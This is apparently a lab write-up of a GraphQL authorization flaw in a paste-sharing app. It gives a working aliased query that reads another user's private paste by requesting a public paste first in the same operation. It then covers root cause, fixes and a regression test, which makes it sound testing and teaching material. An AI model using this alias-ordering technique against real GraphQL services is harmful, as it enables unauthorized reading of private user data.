# PasteShare GraphQL Alias IDOR

## Date

2026-06-11

## Target Type

Owned pwnbox lab GraphQL paste-sharing application.

## Bug Class

GraphQL IDOR / broken object-level authorization caused by order-dependent authorization result reuse.

## Observation

The SPA loads `/app.js` and sends GraphQL requests to `/graphql`. The hinted `/garphql` path is not the API endpoint for POST requests.

Client-exposed operations:

- `me`
- `paste(id)`
- `myPastes`
- `publicPastes`
- `register`
- `login`
- `createPaste`
- `updatePaste`
- `deletePaste`

GraphQL introspection is enabled and confirms only `User`, `Paste`, `AuthPayload`, `Query`, `Mutation`, and `Visibility`.

## Initial Signal

Direct unauthenticated read of the hinted private paste ID is blocked:

```graphql
query($id: ID!) {
  paste(id: $id) {
    id
    title
    content
    visibility
  }
}
```

Variables:

```json
{"id":"00000000-0000-0000-0000-000000000000"}
```

Result:

```text
Not authorized
```

Direct read as a normal registered user is also blocked. Direct `updatePaste(id)` as the normal user is blocked.

## Working Theory

The `paste(id)` authorization rule likely checks whether the paste is public or owned by the current user, but its result is reused too broadly within one GraphQL operation.

If the same rule returns `true` for a public paste first, a later aliased `paste(id)` field for a private paste in the same operation inherits the allowed result.

## Minimal Reproduction

No authentication is required.

```graphql
query($pub: ID!, $target: ID!) {
  allowed: paste(id: $pub) {
    id
    title
    visibility
    owner { username }
  }
  target: paste(id: $target) {
    id
    title
    content
    visibility
    owner { id username }
    createdAt
  }
}
```

Variables:

```json
{
  "pub": "fe6d807e-8e88-44b3-b1b3-c39a25ebde6a",
  "target": "00000000-0000-0000-0000-000000000000"
}
```

Observed result:

```text
allowed.visibility = PUBLIC
target.visibility = PRIVATE
target.owner.username = admin
target.content contains the challenge proof
```

## Negative Control

Reversing field order blocks both fields:

```graphql
query($pub: ID!, $target: ID!) {
  target: paste(id: $target) {
    id
    title
    content
  }
  allowed: paste(id: $pub) {
    id
    title
    visibility
  }
}
```

Result:

```text
target: Not authorized
allowed: Not authorized
```

This order dependency supports authorization result caching/reuse as the root cause rather than simple missing checks in the resolver.

## Root Cause

Confirmed behavior:

```text
public paste authorization succeeds
-> same operation later requests private paste by direct object ID
-> private paste is returned without ownership
```

Likely implementation issue:

```text
graphql-shield rule for Query.paste is cached per request/context/field too broadly
instead of being keyed by args.id and user identity, or disabled for object-specific checks
```

The stack trace in errors references `/app/src/shield.js`, consistent with GraphQL Shield being the authorization layer.

## Impact

An unauthenticated attacker can read private paste content when they know or can guess a private paste ID and include any readable public paste first in the same aliased GraphQL operation.

## Fix

- Do not cache object-level authorization decisions unless the cache key includes the object identifier, authenticated user, and relevant arguments.
- For GraphQL Shield, use strict argument-aware caching or disable caching for rules that depend on `args.id`.
- Enforce authorization in the resolver or data-access layer as a second line of defense.
- Avoid leaking stack traces in GraphQL errors in production.

## Regression Test

Send one GraphQL operation with two aliases:

1. `allowed: paste(id: <public-id>)`
2. `target: paste(id: <private-id-owned-by-another-user>)`

Expected secure result:

```text
allowed returns the public paste
target returns Not authorized
```

